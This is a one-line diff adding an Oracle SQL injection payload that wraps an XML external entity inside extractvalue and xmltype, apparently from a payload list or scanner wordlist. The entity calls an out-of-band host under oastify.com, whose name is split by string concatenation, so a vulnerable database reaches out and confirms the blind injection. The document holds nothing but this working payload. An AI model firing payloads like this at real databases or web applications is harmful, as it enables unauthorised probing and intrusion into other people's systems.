@@ -1,0 +1,1 @@
+(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ewxtv SYSTEM "http://lvk7s20cd97u0rajj0y9kp3r1i7bv20q3ev1npc.oasti'||'fy.com/">%ewxtv;]>'),'/l') from dual)
